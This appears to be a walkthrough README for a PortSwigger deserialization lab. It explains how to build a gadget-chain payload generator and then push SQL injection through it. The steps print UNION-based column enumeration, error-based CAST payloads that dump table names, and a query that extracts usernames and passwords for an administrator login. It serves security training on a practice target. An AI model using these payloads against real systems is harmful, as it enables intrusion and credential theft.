# [Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

### How to solve

1. Build the payload generator jar with `./build.sh`.
2. Export your lab ID as an environment variable with `export LABID=xxxx`
3. Execute SQL payloads and see the response with `./exec.sh "sql here"`\
   Your input will inject into a SQL query like so:\
   `SELECT * FROM products WHERE id = 'x' <sql here> -- LIMIT 1`.
4. Enumerate the number of columns.\
`./exec.sh "UNION SELECT NULL"`\
`./exec.sh "UNION SELECT NULL,NULL"`\
`./exec.sh "UNION SELECT NULL,NULL,..."`
5. Find a column that reflects your input due to a data type mismatch.\
`./exec.sh "UNION SELECT 'xx',NULL,NULL,NULL,..."`\
`./exec.sh "UNION SELECT NULL,'xx',NULL,NULL,..."`\
`./exec.sh "UNION SELECT NULL,NULL,'xx',NULL,..."`\
`./exec.sh "UNION SELECT NULL,NULL,NULL,'xx',..."`
6. Dump table names by inserting the following SQL into the column that reflects your input.\
`CAST((SELECT STRING_AGG(table_name, ' ') FROM information_schema.tables WHERE table_schema='public') AS numeric)`
7. Dump account names and passwords from the users table with:\
`CAST((SELECT STRING_AGG(CONCAT(username, ':', password), ' ') FROM users) AS numeric)`
8. Log into the administrator account and complete the lab.